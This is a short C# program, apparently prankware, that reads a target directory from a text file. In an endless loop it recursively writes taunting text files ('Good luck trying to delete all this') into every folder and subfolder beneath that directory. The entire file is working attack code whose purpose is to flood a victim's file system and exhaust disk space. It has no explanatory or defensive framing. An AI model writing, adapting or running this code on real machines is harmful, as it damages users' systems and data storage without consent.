using System;
using System.IO;


class Script
{
    private static int nameCounter = 0;
    private static readonly string textFileLocation = @"C:\duplicate_location.txt";
    private static readonly string whereAttackHappens = ReadAttackPath();

    static void Main(string[] args)
    {
        while(true)
        {
            StartProgram();
        }
        Console.ReadKey();
    }


    private static void StartProgram()
    {
        string[] directories = Directory.GetDirectories(whereAttackHappens);

        foreach (string directory in directories)
        {
            //create file in specified root
            AddFileInAllFolders(directory);
        }
    }

    private static void AddFileInAllFolders(string directory)
    {
        File.WriteAllText(directory + @"\hello_there" + nameCounter++ + ".txt", "Hello, boy. Good luck trying to delete all this.");
        // Add files in all sub folders
        AddFileInSubFolders(directory);
    }

    private static void AddFileInSubFolders(string directory)
    {
        string[] subDirectories = Directory.GetDirectories(directory);
        foreach(string subDirectory in subDirectories)
        {
            File.WriteAllText(subDirectory + @"\hello_there" + nameCounter++ + ".txt", "Hello, boy. Good luck trying to delete all this.");
            AddFileInSubFolders(subDirectory);
        }
    }

    private static string ReadAttackPath()
    {
        return File.ReadAllText(textFileLocation);
    }
}